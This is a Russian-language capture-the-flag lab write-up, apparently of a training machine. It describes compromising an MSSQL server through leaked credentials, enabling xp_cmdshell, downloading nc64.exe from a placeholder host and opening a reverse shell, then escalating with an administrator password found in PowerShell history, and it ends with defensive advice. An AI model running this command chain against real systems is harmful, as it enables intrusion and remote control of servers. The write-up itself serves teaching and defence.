#### **Уязвимость:**

Уязвимость, которую мы эксплуатировали, связана с **неправильной конфигурацией Microsoft SQL Server (MSSQL)**. В данном случае:

1. **Слабые учетные данные:** В конфигурационном файле **prod.dtsConfig** был обнаружен пароль пользователя **sql_svc** в открытом виде: **M3g4c0rp123**.
    
2. **Включение `xp_cmdshell`:** У пользователя **sql_svc** были права администратора (`sysadmin`), что позволило нам включить `xp_cmdshell` — функцию, которая позволяет выполнять команды операционной системы через SQL Server.
    

---

#### **Что мы сделали для эксплуатации уязвимости:**

1. **Разведка (Enumeration):**
    
    - Сканирование портов с помощью **nmap** показало, что на машине открыты порты **SMB (445)** и **MSSQL (1433)**.
        
    - Использование **smbclient** позволило обнаружить общий ресурс **backups**, где был найден файл **prod.dtsConfig** с учетными данными.
        
2. **Подключение к MSSQL:**
    
    - С помощью инструмента **Impacket** (скрипт `mssqlclient.py`) мы подключились к MSSQL, используя учетные данные **sql_svc:M3g4c0rp123** .
        
3. **Активация `xp_cmdshell`:**
    
    - Проверили, что у пользователя есть права администратора:
        
        sql
        
        Copy
        
        SELECT is_srvrolemember('sysadmin');
        
    - Активировали `xp_cmdshell`:
        
        sql
        
        Copy
        
        EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
        EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
        
4. **Получение обратной оболочки (Reverse Shell):**
    
    - Загрузили **nc64.exe** на целевую машину с помощью **PowerShell**:
        
        sql
        
        Copy
        
        xp_cmdshell "powershell -c wget http://<YOUR_IP>/nc64.exe -outfile nc64.exe"
        
    - Запустили обратную оболочку:
        
        sql
        
        Copy
        
        xp_cmdshell "powershell -c .\nc64.exe -e cmd.exe <YOUR_IP> 4444"
        
5. **Повышение привилегий (Privilege Escalation):**
    
    - Использовали **winPEAS** для поиска уязвимостей.
        
    - Обнаружили файл **ConsoleHost_history.txt**, в котором был сохранен пароль администратора: **MEGACORP_4dm1n!!**.
        
    - Использовали **psexec.py** из Impacket для получения доступа к системе с правами администратора.
        

---

#### **Итог:**

Мы эксплуатировали слабые учетные данные и неправильную конфигурацию MSSQL, чтобы получить доступ к системе, а затем повысили привилегии до уровня администратора. Это классический пример того, как утечка учетных данных и неправильная настройка серверов могут привести к полному компрометированию системы.

---

### Как защититься от подобной уязвимости:

6. **Не храните пароли в открытом виде:** Используйте безопасные методы хранения паролей, такие как хэширование или использование менеджеров паролей.
    
7. **Ограничьте права пользователей:** Убедитесь, что у пользователей MSSQL нет прав администратора, если это не требуется.
    
8. **Отключите `xp_cmdshell`:** Если эта функция не используется, отключите её для предотвращения выполнения произвольных команд.
    
9. **Регулярно обновляйте и патчите системы:** Убедитесь, что MSSQL и операционная система обновлены до последних версий.
    
10. **Мониторинг и аудит:** Регулярно проверяйте логи на подозрительную активность.